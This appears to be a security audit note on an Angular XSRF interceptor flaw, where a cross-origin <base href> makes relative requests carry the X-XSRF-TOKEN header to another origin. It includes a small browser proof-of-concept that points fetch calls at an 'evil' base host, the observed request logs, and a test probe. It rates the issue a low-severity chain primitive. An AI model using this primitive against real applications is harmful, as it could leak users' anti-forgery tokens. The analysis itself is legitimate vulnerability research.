# A8 - Angular XSRF ignores document base URL for relative request origin

Status: `CONFIRMED-PRIMITIVE / CHAIN-REQUIRED`

## Summary

Angular's XSRF interceptor decides whether to attach `X-XSRF-TOKEN` by resolving request URLs
against `PlatformLocation.href` origin:

```ts
const {origin: locationOrigin} = new URL(locationHref);
const {origin: requestOrigin} = new URL(req.url, locationOrigin);
```

The browser, however, resolves relative `fetch()` and `XMLHttpRequest` URLs against the document
base URL. If a document has a cross-origin `<base href>`, relative and root-relative request strings
can be sent to that cross-origin base while Angular still classifies them as same-origin and adds
the XSRF header.

## Confirmed behavior

Browser behavior in Chrome headless:

```html
<base href="http://127.0.0.1:8123/evil/">
<script>
  fetch('api', {method: 'POST', headers: {'X-Test': 'fetch'}});
  fetch('/root-api', {method: 'POST', headers: {'X-Test': 'fetch-root'}});
</script>
```

Observed requests on the base-origin server:

```text
OPTIONS /evil/api
POST    /evil/api       X-Test: fetch
OPTIONS /root-api
POST    /root-api       X-Test: fetch-root
```

Angular framework behavior in `packages/common/http/test:x test`:

```ts
for (const url of ['api', '/api', './api', '../api']) {
  interceptor.intercept(new HttpRequest('POST', url, {}), backend).subscribe();
  const req = backend.expectOne(url);
  expect(req.request.headers.get('X-XSRF-TOKEN')).toEqual('test');
}
```

The official Angular test target passed with this temporary probe.

## Impact

Potential XSRF token disclosure to a cross-origin endpoint if all of the following hold:

1. The Angular page has an attacker-controlled or misconfigured cross-origin `<base href>`.
2. The app uses default XSRF protection and makes mutating relative `HttpClient` requests.
3. The target cross-origin endpoint allows the CORS preflight for the XSRF header.

The attacker-controlled server would first receive a preflight containing:

```text
Access-Control-Request-Headers: x-xsrf-token
```

If it allows the header, the real POST can include:

```text
X-XSRF-TOKEN: <token from document.cookie>
```

## Severity assessment

Not report-ready as a standalone bug.

The primitive is real, but the exploit requires control over `<base href>` or a deployment mistake.
If an attacker can inject arbitrary `<base>` into the document, the app is already in a serious HTML
injection state. This becomes reportable only with a realistic chain where base href is controlled
without full script execution and where leaking the XSRF token has measurable impact.

Provisional severity: `Low` / chain primitive.

